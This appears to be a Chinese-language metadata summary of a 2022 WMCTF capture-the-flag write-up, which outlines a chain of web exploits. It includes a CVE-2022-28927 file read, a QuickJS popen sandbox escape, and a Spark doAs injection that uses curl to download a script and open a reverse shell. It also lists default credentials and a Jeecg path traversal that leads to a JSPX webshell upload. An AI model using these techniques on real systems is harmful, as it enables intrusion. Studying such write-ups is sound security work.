...
- /toLogin.do/..;/
attack_chain:
- 'Web subconverter: CVE-2022-28927 subconverter 任意文件读 pref.toml 拿 token'
- QuickJS std.popen('/readflag > /app/flag1;/app/readflag > /app/flag2', 'r') JS 沙箱逃逸 RCE
- URL md5 文件名作为 script 路径 + token → /sub?url=script:cache/...&token=...&target=quanx
- 'Java: 扫内网 10.244.0.x:8080 找 Hadoop Spark'
- POST /file doAs=;curl+http://.../>/tmp/1 URL 编码绕过
- 再次 doAs=bash /tmp/1 反弹 shell
- 'nanoScore: /users 注册用户列表 + 默认密码 Ha1c9on/123456 拿 W&M 队账号'
- 'easyjeecg: /toLogin.do/..;/jeecgFormDemoController.do?saveFiles 路径穿越 + JSPX webshell 上传'
...
quality: high
full_path: 2022_WMCTF-wp.full.md
meta_path: 2022_WMCTF-wp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2022 WMCTF WP。WMCTF 2022 4 大题：CVE-2022-28927+QuickJS+Hadoop SSRF+Jeecg path traversal。关键路径：Web subconverter: CVE-2022-28927 subconverter 任意文件读 pref.toml 拿 token → QuickJS std.popen(''/readflag > /ap...'
category: web
subcategory: lfi
subcategories:
- lfi
...
contest_type: open
wp_url: https://www.ctfiot.com/53857.html
reasoning_chain:
- '[触发点] subconverter CVE-2022-28927 任意文件读 pref.toml → 假设：拿 token / [动作] convert?url=file:///app/pref.toml / [观察] token / [下一步] QuickJS'
- '[触发点] QuickJS std.popen → 假设：JS 沙箱逃逸 / [动作] std.popen(''/readflag > /app/flag1;/app/readflag > /app/flag2'', ''r'') / [观察] flag1+flag2 / [下一步] Hadoop Spark'
- '[触发点] 扫内网 10.244.0.x:8080 → 假设：Hadoop Spark / [动作] POST /file doAs=;curl+http://.../>/tmp/1 URL 编码 / [观察] 写入 /tmp/1 / [下一步] doAs 触发'
- '[触发点] doAs=bash /tmp/1 → 反弹 shell → 假设：URL 编码绕过 / [动作] 编码 ; curl http://... / /下一步] nanoScore + easyjeecg'
- '[触发点] nanoScore /users 默认密码 Ha1c9on/123456 → 假设：撞库 / [动作] 登录 W&M 队 / [观察] 拿分 / [下一步] easyjeecg'
- '[触发点] /toLogin.do/..;/jeecgFormDemoController.do?saveFiles → 假设：Jeecg 路径穿越 / [动作] /..;/jeecgFormDemoController.do / [观察] JSPX webshell 上传 / [下一步] 完成'
failed_attempts:
- 试图默认 Spark UI 拿 shell → 失败：doAs 需 URL 编码绕过
- 试图直接上传 JSPX → 失败：被拦截 → /..;/ 穿越
key_observations:
- QuickJS std.popen 沙箱逃逸
- Spark doAs URL 编码绕过
- Jeecg 路径穿越 /..;/ 是经典
- CVE-2022-28927 subconverter 是配置类任意文件读
prerequisites:
- CVE-2022-28927 subconverter 利用
- QuickJS std.popen API
- Hadoop Spark doAs 攻击
- Jeecg 路径穿越 /..;/ 攻击面
---
# 2022 WMCTF-wp
